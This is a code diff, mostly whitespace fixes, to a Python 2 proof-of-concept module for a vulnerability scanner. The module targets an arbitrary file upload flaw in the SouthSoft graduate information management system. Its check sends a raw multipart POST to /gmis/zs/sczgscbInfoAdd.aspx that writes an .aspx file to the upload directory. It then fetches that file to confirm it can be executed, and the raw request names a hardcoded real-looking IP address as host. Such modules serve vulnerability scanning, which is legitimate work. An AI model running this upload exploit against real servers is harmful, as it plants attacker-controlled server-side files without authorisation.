@@ -1,22 +1,23 @@
 # coding: utf-8
 
-from CScanPoc.thirdparty import requests,hackhttp
+from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
+
 class Vuln(ABVuln):
-    vuln_id = 'SouthSoft_0001' # 平台漏洞编号，留空
-    name = '南软研究生信息管理系统任意上传' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    vuln_id = 'SouthSoft_0001'  # 平台漏洞编号，留空
+    name = '南软研究生信息管理系统任意上传'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-06-04'  # 漏洞公布时间
     desc = '''
         南软研究生信息管理系统任意上传漏洞。
         /gmis/zs/sczgscbInfoAdd.aspx
-    ''' # 漏洞描述
-    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=98176
-    cnvd_id = 'Unknown' # cnvd漏洞编号
-    cve_id = 'Unknown' #cve编号
+    '''  # 漏洞描述
+    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=98176
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
     product = 'SouthSoft'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
@@ -24,7 +25,7 @@ class Vuln(ABVuln):
 class Poc(ABPoc):
     poc_id = '59b67026-cdd0-425b-bbef-8fd68566df50'
     author = '国光'  # POC编写者
-    create_date = '2018-05-15' # POC创建时间
+    create_date = '2018-05-15'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -34,7 +35,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            raw1= '''
+            raw1 = '''
 POST /gmis/zs/sczgscbInfoAdd.aspx HTTP/1.1
 Host: 211.64.205.214
 Proxy-Connection: keep-alive
@@ -75,12 +76,13 @@ Content-Disposition: form-data; name="txtBZ"
 
 testvul
 ------WebKitFormBoundaryNNHfzqBMQ1CNoTfG--'''
-            url = arg+ '/gmis/zs/sczgscbInfoAdd.aspx'
-            payload=arg+'/gmis/ZS/uploadfiles/xq17.aspx'
-            code, head, res, errcode, _ = hh.http(url,raw=raw1)
+            url = arg + '/gmis/zs/sczgscbInfoAdd.aspx'
+            payload = arg+'/gmis/ZS/uploadfiles/xq17.aspx'
+            code, head, res, errcode, _ = hh.http(url, raw=raw1)
             code1, head, res, errcode, _ = hh.http(payload)
-            if code1 ==200 and 'testvul' in res:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
+            if code1 == 200 and 'testvul' in res:
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
